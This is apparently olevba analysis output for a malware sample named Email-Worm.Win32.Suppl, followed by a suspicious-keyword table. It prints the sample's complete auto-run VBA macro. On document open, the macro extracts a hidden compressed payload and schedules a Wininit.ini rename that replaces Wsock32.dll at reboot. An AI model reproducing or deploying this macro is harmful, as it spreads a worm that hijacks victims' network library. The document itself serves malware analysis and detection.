olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.Win32.Suppl
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Email-Worm.Win32.Suppl - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Sub GetWindowsDirectoryA Lib "KERNEL32" (ByVal s As String, ByVal l As Long)
Private Declare Sub GetSystemDirectoryA Lib "KERNEL32" (ByVal s As String, ByVal l As Long)
Private Declare Sub CopyFileA Lib "KERNEL32" (ByVal src As String, ByVal dst As String, ByVal mode As Long)
Private Declare Function GetFileAttributesA Lib "KERNEL32" (ByVal s As String) As Long
Private Declare Sub lstrcatA Lib "KERNEL32" (ByVal dst As String, ByVal src As String)
Private Declare Function lstrlenA Lib "KERNEL32" (ByVal s As String) As Long
Private Declare Function LZOpenFileA Lib "LZ32" (ByVal s As String, ByVal o As String, ByVal mode As Long) As Long
Private Declare Sub LZCopy Lib "LZ32" (ByVal src As Long, ByVal dst As Long)
Private Declare Sub LZClose Lib "LZ32" (ByVal h As Long)
Private Declare Function OpenFile Lib "KERNEL32" Alias "_lopen" (ByVal s As String, ByVal mode As Long) As Long
Private Declare Function CreateFile Lib "KERNEL32" Alias "_lcreat" (ByVal s As String, ByVal attr As Long) As Long
Private Declare Sub SeekFile Lib "KERNEL32" Alias "_llseek" (ByVal h As Long, ByVal ofs As Long, ByVal fw As Long)
Private Declare Sub ReadFile Lib "KERNEL32" Alias "_lread" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long)
Private Declare Sub WriteFile Lib "KERNEL32" Alias "_lwrite" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long)
Private Declare Sub WriteFile1 Lib "KERNEL32" Alias "_lwrite" (ByVal h As Long, ByVal ptr As String, ByVal n As Long)
Private Declare Sub CloseFile Lib "KERNEL32" Alias "_lclose" (ByVal h As Long)
Private Declare Function GlobalAlloc Lib "KERNEL32" (ByVal fl As Long, ByVal n As Long) As Long
Private Declare Sub GlobalFree Lib "KERNEL32" (ByVal ptr As Long)
Private Sub Document_Open()
If InStr(1, System.OperatingSystem, "Windows") <> 0 Then
Dim ws1 As String, ws2 As String
ws1 = String(256, "X")
GetSystemDirectoryA ws1, 256
ws2 = ws1
lstrcatA ws1, "\Wsock32.dll"
lstrcatA ws2, "\Wsock33.dll"
If GetFileAttributesA(ws2) = -1 Then
Dim ai As String, dt1 As String, dt2 As String, wi As String
Dim h As Long, g As Long, p As Long, ofs1 As String, ofs2 As String
Dim w As String
ai = ws1
GetWindowsDirectoryA ai, 256
dt1 = ai
dt2 = ai
wi = ai
ofs1 = ai
ofs2 = ai
lstrcatA ai, "\Anthrax.ini"
lstrcatA dt1, "\DLL.lzh"
lstrcatA dt2, "\DLL.tmp"
lstrcatA wi, "\Wininit.ini"
CopyFileA ActiveDocument.FullName, ai, 0
p = GlobalAlloc(0, 6712)
h = OpenFile(ai, 0)
SeekFile h, 32256, 0
ReadFile h, p, 6712
CloseFile h
h = CreateFile(dt1, 0)
WriteFile h, p, 6712
CloseFile h
GlobalFree (ptr)
h = LZOpenFileA(dt1, ofs1, 0)
g = LZOpenFileA(dt2, ofs2, 4096)
LZCopy h, g
LZClose g
LZClose h
w = "[rename]" & Chr(13) & Chr(10) & "nul=" & String(1010, 0)
lstrcatA w, dt1
lstrcatA w, Chr(13) & Chr(10) & Chr(0)
lstrcatA w, ws2
lstrcatA w, "="
lstrcatA w, ws1
lstrcatA w, Chr(13) & Chr(10) & Chr(0)
lstrcatA w, ws1
lstrcatA w, "="
lstrcatA w, dt2
h = CreateFile(wi, 0)
WriteFile1 h, w, lstrlenA(w)
CloseFile h
End If
End If
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Wsock32.dll         |Executable file name                         |
|IOC       |Wsock33.dll         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

